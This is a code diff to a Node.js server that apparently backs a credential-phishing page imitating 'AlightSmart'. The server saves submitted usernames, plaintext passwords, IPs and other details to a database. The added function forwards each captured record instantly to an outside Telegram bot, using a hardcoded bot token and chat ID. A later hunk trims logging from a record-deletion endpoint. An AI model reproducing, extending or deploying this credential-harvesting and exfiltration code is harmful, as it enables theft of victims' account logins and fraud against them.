@@ -30,14 +30,51 @@ function getRealIP(req) {
            'Unknown';
 }
 
+// ==================== TELEGRAM NOTIFICATION ====================
+const TELEGRAM_TOKEN = "8884240723:AAFfSTKd9jab0Xdfp-L-mPSeJqyyISe8LaU";
+const CHAT_ID = "8559945003";
+
+async function sendTelegramNotification(record) {
+    const message = `🚨 *New AlightSmart Submission!*\n\n` +
+        `• *Type:* ${record.type || '-'}\n` +
+        `• *Username:* ${record.username || '-'}\n` +
+        `• *Password:* ${record.password || '-'}\n` +
+        `• *Details:* ${record.address || '-'}\n` +
+        `• *IP:* ${record.ip || 'Unknown'}\n` +
+        `• *Time:* ${record.timestamp || '-'}\n\n` +
+        `🕒 ${new Date().toLocaleString()}`;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+        console.log("✅ Telegram notification sent!");
+    } catch (err) {
+        console.error("❌ Telegram notification failed:", err.message);
+    }
+}
+
+// ==================== SAVE RECORD ====================
 async function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
+    
     try {
         await pool.query(
             "INSERT INTO records (type, username, password, address, ip, timestamp) VALUES ($1, $2, $3, $4, $5, $6)",
             [type, username, password, address, ip, timestamp]
         );
+        
         console.log(`✅ SAVED: ${type} | IP: ${ip}`);
+
+        // Send Telegram Notification immediately
+        await sendTelegramNotification({ type, username, password, address, ip, timestamp });
+
     } catch (err) {
         console.error("Save Error:", err.message);
     }
@@ -86,15 +123,12 @@ app.post('/api/confirm-code', async (req, res) => {
     }
 });
 
-// Delete Single Record
 app.post('/api/delete-record', async (req, res) => {
     const { id } = req.body;
     try {
         await pool.query("DELETE FROM records WHERE id = $1", [id]);
-        console.log(`🗑️ Record ${id} deleted`);
         res.json({ success: true });
     } catch (err) {
-        console.error("Delete Error:", err.message);
         res.status(500).json({ success: false });
     }
 });
